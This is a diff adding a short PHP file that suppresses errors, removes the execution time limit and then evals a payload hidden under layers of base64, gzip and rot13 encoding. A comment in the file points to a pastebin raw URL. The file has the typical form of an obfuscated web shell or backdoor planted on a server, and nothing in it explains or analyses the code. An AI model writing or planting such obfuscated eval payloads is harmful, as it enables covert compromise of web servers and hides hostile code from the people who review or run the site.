@@ -1,0 +1,8 @@
+<?php
+/*https://pastebin.com/raw/HQhtk4Qq*/
+session_start();
+error_reporting(0);
+set_time_limit(0);
+date_default_timezone_set('Asia/Jakarta');
+eval(str_rot13(gzinflate(str_rot13(base64_decode('DcHJZYIwAADQzykdD+wi0+lOISAgdXWq2ItQ2BRxC6mBfH37Hmxni0NJxa3AlawKtH2l09JIUei7kqy121UGPBLhDR7aLcPnGsX7CZjM81d3eNLZZI+nDlS1S9BzTEMyQonk96G5urNKz9WdhWPQGKVIEWFOnr7ae0XVg75C+JdY8nyWqLKNwNYTs5MMpv3lZIZpFD9EvaG+yLo+poHlz0qHESQy3Z9+Bh+O1pwZbaldri1bDmvmslUhMv0nhfoKH7tFIzmVwgbAAdQOz0Ph2qH7O6zTjigO7Ug+2s0aTqApejaI5iXIIpkZaJEqCuhw4A1rkflkl4fTaqV5rKAKiLEQ0UPUzefb+7+PPw==')))));
+?>
